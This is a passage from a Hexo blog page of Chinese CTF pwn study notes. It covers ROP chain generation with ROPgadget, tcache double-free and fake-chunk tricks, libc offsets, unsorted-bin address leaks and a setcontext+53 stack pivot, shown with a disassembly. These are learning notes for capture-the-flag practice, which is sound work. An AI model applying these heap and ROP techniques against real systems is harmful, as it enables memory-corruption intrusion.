<li><p><code>ROPgadget --binary ./ciscn_s_8 --ropchain</code>直接形成rop链</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210409170956236.png" alt="image-20210409170956236"></p>
</li>
<li><p>在tcachebins中，doublefree修改next指针得到目的地址后，对应大小的bins为-1，即为0xff</p>
</li>
<li><p>当dele被限制次数时，可以在chunk中构造一个fakechunk（释放后可以进入unsortbin中），通过tcache_struct将构造后的fakechunk放入tcache中，会在tcache中形成无线循环链表，构造方法如下。在达到相应目的后，可以在通过覆盖fakechunk的next指针来指向目标地址。</p>
<p><img src="D:\qq\2293245197\FileRecv\MobileFile\20200430183408568.png" alt="image"></p>
</li>
<li><p><strong>问题</strong>：当执行完系统调用后，各寄存器的值如何变化？ </p>
</li>
<li><p><strong>问题</strong>：ciscn_2019_n_2为什么不能改变got表。答案：因为<strong>开启了Full RELRO防护，使got表为只读。</strong></p>
</li>
<li><p>libc2.23:0xb78   libc-2.27:0xca0  libc-2.30、libc-2.31:0xbe0 libc-2.32:0xc00</p>
</li>
<li><p>bins数组：bins数组中存有unsortbin（1个）、smallbin（62个 chunk大小与数组下标关系 chun_size=2*SIZE_SZ*index （SIZE_SZ=4（32位）或8（64位）））、largebin（63个）</p>
<p>smallbin：</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210421180339718.png" alt="image-20210421180339718"></p>
</li>
</ul>
<p>largebin：</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210421180408843.png" alt="image-20210421180408843"></p>
<ul>
<li><p>做虚拟机的题时先找到栈，再在栈上做操作</p>
</li>
<li><p>如果想控制prev_size的值，除了直接写之外，还可以将其上放的chunk释放掉，这样prev_size域就会被改写为被释放掉的chunk的大小，这时，在释放自己本身，接着会和上方已被释放掉的freechunk合并，且prev_size域不变，再通过两次malloc申请会原来的chunk（prev_size依旧不变）。（在unsortedbin中以调试）</p>
</li>
<li><p>当你的输入最后一位被置0造成00截断无法用show泄露地址时：</p>
</li>
<li><p>方法1：通过分割unsortedbin，使地址被放入没有释放的chunk中，不用输入就直接show泄露。</p>
</li>
<li><p>当遇见switch结构时，分析他有无default，如果没有，则可以跳过此switch</p>
</li>
<li><p>调试小技巧：使用io.recv(timeout=200000000)。</p>
</li>
<li><p>libc中的汇编代码</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210528181156959.png" alt="image-20210528181156959"></p>
</li>
<li><p>setcontext+53可以直接设置rsp的值，更改栈的地址（不同libc版本中的setcontext不同）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext&gt;:     push   rdi</span><br><span class="line">&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">&lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">&lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">&lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">&lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">&lt;setcontext+26&gt;:  syscall </span><br><span class="line">&lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;</span><br><span class="line">&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">&lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx #此处有push操作，在设置rsp是确保rsp里的值-8是可写地址，同时可以将rcx设置为ret的地址。</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br><span class="line">&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78</span><br><span class="line">&lt;setcontext+135&gt;: neg    eax</span><br><span class="line">&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>raw_input()</li>
<li>有strncmp()函数时，覆盖栈上数据时要注意其参数的地址必须是可读的</li>
<li>问题exceve函数的第一个参数不能为sh？</li>
</ul>
<h2 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h2><ul>
<li>此代码可以进行截断，防止泄露重要数据：v1[read(0, v1, 7u)] = 0</li>
<li>将call的值改为函数的plt地址</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/06/10/Pwn1/" data-id="ckpqu9tlt0001gwt1eaeh28me" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2021/06/10/my-new-post/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">my new post</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/06/10/Pwn1/">(no title)</a>
          </li>
        
          <li>
            <a href="/2021/06/10/my-new-post/">my new post</a>
          </li>
        
          <li>
            <a href="/2021/06/10/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>